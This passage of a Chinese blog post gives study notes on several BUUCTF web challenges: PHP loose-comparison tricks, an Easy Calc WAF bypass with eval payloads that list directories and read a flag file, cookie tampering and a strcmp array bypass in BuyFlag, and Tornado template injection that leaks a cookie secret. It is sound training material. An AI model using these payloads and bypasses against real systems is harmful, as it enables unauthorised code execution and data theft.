class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序通过 GET 方法获取变量 <kbd>key</kbd>，若变量不是数字或数字字符串则程序输出提示信息并退出，若是则获取其整形数值并与字符串 <kbd>123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</kbd> 作比较，只要相同程序就会输出 <kbd>flag</kbd>。值得注意的是，最后与字符串的比较使用的是弱等于，即将两边转换为相同类型之后再比较，而上述字符串转换为整形之后值为 <kbd>123</kbd>。因此，直接传入 <kbd>123</kbd> 即可。</p></li><li><p>由上直接通过 GET 方法向变量 <kbd>key</kbd> 传递值 <kbd>123</kbd>，回车之后便是 <kbd>flag</kbd>。</p><img src="0062.webp" alt="" style="zoom:75%"></li></ul><h2 id="RoarCTF-2019-Easy-Calc">[RoarCTF 2019]Easy Calc</h2><ul><li><p>打开靶机，页面为一个计算器，输入正常算式时可以返回正确的计算结果，但是若输入的并非算式，则会跳出弹窗提示。</p><img src="0063.webp" alt="" style="zoom:75%"></li><li><p>弹窗提醒则前端必定含有相关代码，查看源码发现如下 <kbd>js</kbd> 代码且带有注释表示设置了 <kbd>WAF</kbd> 来确保安全。代码中 <kbd>ajax</kbd> 用于从服务器获取信息并更新在网页中（不用刷新网页），因此用户提交数据时就会将数据通过这里上传至服务器完成计算并返回相应信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>值得注意的是，用户数据最终通过 GET 方法传递给了网页目录中的 <kbd>calc.php</kbd> 文件，因此尝试直接访问该文件，发现直接回显出了源代码，当然这是因为作者设定好未接收到变量则回显代码，只能说感谢手下留情了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">// 未接收到变量则回显代码</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码中设定了一列黑名单字符并使用正则表达式匹配，其中 <kbd>/m</kbd> 修饰符表示多行匹配，若匹配到则程序终止，未匹配到则送入 <kbd>eval()</kbd> 函数执行计算。</p></li><li><p>可以发现源码中的黑名单中并不包含普通字母数字等字符，但是实测单纯输入字母数字序列依然会返回错误。直接向 <kbd>calc.php</kbd> 文件传递参数会发现返回的是 <kbd>403 Forbidden</kbd>，也就是说现在是此前注释中所提示的服务器中开启的 <kbd>WAF</kbd> 在作祟。</p><img src="0064.webp" alt="" style="zoom:75%"></li><li><p>不过，PHP 将字符串解析为变量名时会删除开头的空格，并将一些特殊字符替换为下划线，也就是自动解析为合法变量名。因此在传入数据时可以在变量名之前添加空格，这样 <kbd>WAF</kbd> 就会不认识该变量，但 PHP 却依然会将其解析为 <kbd>num</kbd>，此时便可绕过 <kbd>WAF</kbd>。如下图 <kbd>WAF</kbd> 不再拦截带有字母的序列：</p><img src="0065.webp" alt="" style="zoom:75%"></li><li><p>所以现在就相当于控制 <kbd>eval()</kbd> 函数了，接下来可以利用 <kbd>scandir(&#39;/&#39;)</kbd> 对根目录进行扫描，不过由于单引号被正则匹配过滤了，因此需要使用 <kbd>chr(47)</kbd> 来通过 ASCII 码值转字符。但是，<kbd>scandir()</kbd> 函数返回的是数组，而自带的 <kbd>echo</kbd> 并不能直接输出数组，因此还需借由 <kbd>var_dump()</kbd>、<kbd>var_export()</kbd> 或 <kbd>print_r()</kbd> 函数来输出。输出结果有必要追求简洁好辩认，因此这里使用 <kbd>print_r()</kbd> 函数，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=print_r(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>从结果中可以看出根目录中含有一个可疑对象 <kbd>f1agg</kbd>：</p><img src="0066.webp" alt="" style="zoom:75%"></li><li><p>尝试打开前一步找出来的 <kbd>f1agg</kbd>，使用 <kbd>file_get_contents(/f1agg)</kbd> 即可获得文件内容，同样由于正则过滤的问题需要同一使用 <kbd>chr()</kbd> 函数替代一下，因此使用如下 <kbd>payload</kbd> 即可获得 <kbd>flag</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure></li></ul><h2 id="极客大挑战-2019-BuyFlag">[极客大挑战 2019]BuyFlag</h2><ul><li><p>打开靶机，发现与之前 [[极客大挑战 2019]Http](#[极客大挑战 2019]Http) 页面几乎一样，不过增加了顶栏并且有菜单，除本页面以外，菜单还有一个链接指向 <kbd>pay.php</kbd> 页面，该页面提示只有成信学生可以购买 <kbd>flag</kbd>，并且需要正确密码与 <kbd>100000000</kbd> 块钱。</p><img src="0067.webp" alt="" style="zoom:75%"></li><li><p>虽然得到 <kbd>flag</kbd> 的条件说得十分清楚，但是网页并没有提供任何输入的入口，哪怕是付款码也没有，因此只能去源码中寻找一下。所幸，找到了一段注释提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">~~~post money and password~~~</span></span><br><span class="line"><span class="comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">	$password = $_POST[&#x27;password&#x27;];</span></span><br><span class="line"><span class="comment">	if (is_numeric($password)) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;elseif ($password == 404) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>提示说明需要通过 POST 方法传入 <kbd>money</kbd> 与 <kbd>password</kbd> 两个数据，并且 <kbd>password</kbd> 不能为纯数字且值等于 <kbd>404</kbd>。</p></li><li><p>由于依然是弱等于，因此只需让 <kbd>password</kbd> 等于 <kbd>404a</kbd> 这样的字符串就可以使等号成立，因此只需通过 POST 方法传入以下数据即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">money=100000000&amp;password=404a</span><br></pre></td></tr></table></figure></li><li><p>不过，传入上述数据后，网页依旧提示只有成信学生可以购买。</p><img src="0068.webp" alt="" style="zoom:75%"><p>所以还需要一些证明我们是成信学生的数据，在调试界面，找到了令人在意的数据，即数据包中含有 <kbd>Cookies</kbd> 且值为 <kbd>user=0</kbd>，该数据本身便是用来代表用户身份的，因此修改该数据值大概率有效。尝试将值改为 <kbd>user=1</kbd> 之后便通过了身份验证，密码也提示正确，不过却提示数字过长，也就是说不允许给这么长一串钱。</p><img src="0069.webp" alt="" style="zoom:75%"></li><li><p>长度倒是好说，直接用科学计数法，需要 <kbd>100000000</kbd> 那就给 <kbd>1e8</kbd> 就行了，但是提交之后竟然说钱不够还羞辱了一顿。</p><img src="0070.webp" alt="" style="zoom:75%"><p>不过多给个 <kbd>0</kbd> 他就老老实实交出 <kbd>flag</kbd> 了。</p><img src="0071.webp" alt="" style="zoom:75%"></li><li><p>本题还有个解法是利用后台比较钱时使用的 <kbd>strcmp()</kbd> 函数在接收数组时会出错而返回 <kbd>0</kbd> 的漏洞，返回 <kbd>0</kbd> 就与相等时的结果一致了，也就通过了验钱这一关。该解法的优秀之处在于可以不用给钱，即通过 POST 提交的数据可以如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">money[]=0&amp;password=404a</span><br></pre></td></tr></table></figure></li></ul><h2 id="护网杯-2018-easy-tornado">[护网杯 2018]easy_tornado</h2><ul><li><p>打开靶机，网页内容十分简洁，仅有三个链接指向三个 <kbd>txt</kbd> 文本文件。</p><img src="0072.webp" alt="" style="zoom:75%"><p>其各自 URL 与文本内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URL: http://[靶机地址]/file?filename=/flag.txt&amp;filehash=0b36bbdaea29a745b3f172ce881053f0</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">URL: http://[靶机地址]/file?filename=/welcome.txt&amp;filehash=15e4d9b1223ddb4269d8b481c01cef22</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">URL: http://[靶机地址]/file?filename=/hints.txt&amp;filehash=c08db65f382909e9321ea9ebc85aa03a</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure></li><li><kbd>flag.txt</kbd> 中提示 <kbd>flag</kbd> 位于 <kbd>fllllllllllllag</kbd> 文件中。而 <kbd>welcome.txt</kbd> 中则仅有提示 <kbd>render</kbd>，不过结合题目标题提示 <kbd>tornado</kbd> 可以判断本题使用 <kbd>tornado</kbd> 模板渲染，<kbd>render</kbd> 即该模板中的一个渲染函数。最后的 <kbd>hints.txt</kbd> 提示一种 <kbd>MD5</kbd> 加密方式，结合三个文件的 URL 中 <kbd>filehash</kbd> 变量的 <kbd>32</kbd> 位哈希值可推测该值由 <kbd>hints.txt</kbd> 中的方式计算得出。此外根据 URL 的格式可以推测 <kbd>fllllllllllllag</kbd> 文件的 URL 应该如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机地址]/file?filename=/fllllllllllllag&amp;filehash=[对应哈希值]</span><br></pre></td></tr></table></figure><ul><li><p>不用哈希值直接访问该文件，浏览器跳转到了一个错误页面。其中，错误信息通过 <kbd>msg</kbd> 变量传递。实测直接修改该值即可让网页显示指定内容，但是含有特殊字符的字符串就会被过滤，仅回显 <kbd>ORZ</kbd>。</p><img src="0073.webp" alt="" style="zoom:75%"></li><li><p>翻阅 <kbd>tornado</kbd> 官方文档发现该模板中的表达式使用 <kbd>&#123;&#123; &#125;&#125;</kbd> 包裹，因此若传递使用 <kbd>&#123;&#123; &#125;&#125;</kbd> 包裹好的数据，则很有可能会被解析执行。实测简单表达式传入，发现可以被正常解析，且花括号并没有被过滤，因此漏洞存在。</p><img src="0074.webp" alt="" style="zoom:75%"></li><li><p>要打开 <kbd>fllllllllllllag</kbd> 文件就必须要求出哈希值，而哈希值的算法中 <kbd>filename</kbd> 已知，因此只需获得 <kbd>cookie_secret</kbd> 值即可。继续翻阅 <kbd>tornado</kbd> 官方文档发现该值存在于 <kbd>Application</kbd> 类中的 <kbd>settings</kbd> 属性中 ，<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/latest/web.html?highlight=settings#tornado.web.Application.settings">链接在这</a>，因此只需获取该值即可。但是我们并没有当前使用的 <kbd>Application</kbd> 类的对象可以使用，在官方文档中可以发现 <kbd>RequestHandler.settings</kbd> 正好是 <kbd>Application.settings</kbd> 的别名，所以能得到一个当前的 <kbd>RequestHandler</kbd> 对象也是可以的。</p><img src="0075.webp" alt="" style="zoom:75%"><p>至于当前的 <kbd>RequestHandler</kbd> 对象如何获取，官方文档中又有，在 <kbd>tornado</kbd> 中就存在当前 <kbd>RequestHandler</kbd> 对象的别名 <kbd>handler</kbd>，因此获取 <kbd>handler.settings</kbd> 即可。</p><img src="0076.webp" alt="" style="zoom:75%"></li><li><p>获取该值使用之前的漏洞即可，即将 <kbd>handler.settings</kbd> 使用 <kbd>&#123;&#123; &#125;&#125;</kbd> 包裹赋值给 <kbd>msg</kbd> 变量，所幸花括号与点号均未被过滤，因此可以直接获取数据。最后一串数据即 <kbd>cookie_secret</kbd>。</p><img src="0077.webp" alt="" style="zoom:75%"></li><li><p>获取 <kbd>cookie_secret</kbd> 值后即可求哈希值了，首先计算 <kbd>/fllllllllllllag</kbd> 的 <kbd>MD5</kbd> 值，然后在 <kbd>cookie_secret</kbd> 后连接上该值并再次求 <kbd>MD5</kbd> 值即可。将哈希值放入 URL 对应位置回车即可看到 <kbd>flag</kbd> 显示在了浏览器上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机地址]/file?filename=/fllllllllllllag&amp;filehash=[对应哈希值]</span><br></pre></td></tr></table></figure></li></ul><h2 id="总结-4">总结</h2><p>  老老实实刷题以来终于完成了 <kbd>Web</kbd> 系列的前 <kbd>0x10</kbd> 题，总体来说 <kbd>Web</kbd> 还是比隔壁 <kbd>PWN</kbd> 要简单一些，字数也减少了近一半。但是即使如此，笔者能独自完成而不依赖题解的题目还是少之又少，脑海中的 <kbd>Web</kbd> 相关知识也一直处于又多又杂的状态，好像啥都知道，又啥都不懂。</p><p>  不得不说，<kbd>Web</kbd> 真是越刷越想搞开发去，需要接触那么多有趣的开发框架和开发语言却天天只跟他们的漏洞打交道实在是有些憋屈。</p></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>BUUCTF 刷题笔记——Web 1</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/477423cc/">https://h-t-m.top/posts/477423cc/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-10-08</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-10-19</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/ee33782f/"><img class="prev-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Reverse.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF 刷题笔记——Reverse 1</div></div></a></div><div class="next-post pull-right"><a href="/posts/9e217072/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF 刷题笔记——PWN 1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3ee43a5c/" title="BUUCTF 刷题笔记——Web 0"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-27</div><div class="title">BUUCTF 刷题笔记——Web 0</div></div></a></div><div><a href="/posts/3989fe45/" title="BUUCTF 刷题笔记——Basic 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF 刷题笔记——Basic 1</div></div></a></div><div><a href="/posts/a080afff/" title="BUUCTF 刷题笔记——Basic 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-03</div><div class="title">BUUCTF 刷题笔记——Basic 2</div></div></a></div><div><a href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-23</div><div class="title">BUUCTF 刷题笔记——Crypto 1</div></div></a></div><div><a href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-21</div><div class="title">BUUCTF 刷题笔记——Misc 1</div></div></a></div><div><a href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-22</div><div class="title">BUUCTF 刷题笔记——PWN 1</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">个人博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>找我玩~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1547563662@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/b3beff564d51a.png" target="_blank" title="微信"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/eaa1e2110d4a7.png" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客整体升级改造中</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF 刷题笔记——Web 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">1.1.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.2.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">1.3.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.4.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">1.5.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">1.6.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">1.7.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">1.8.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">1.9.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">1.10.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">1.11.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">1.12.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">1.13.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">1.14.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-number">1.15.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.16.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">1.17.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" 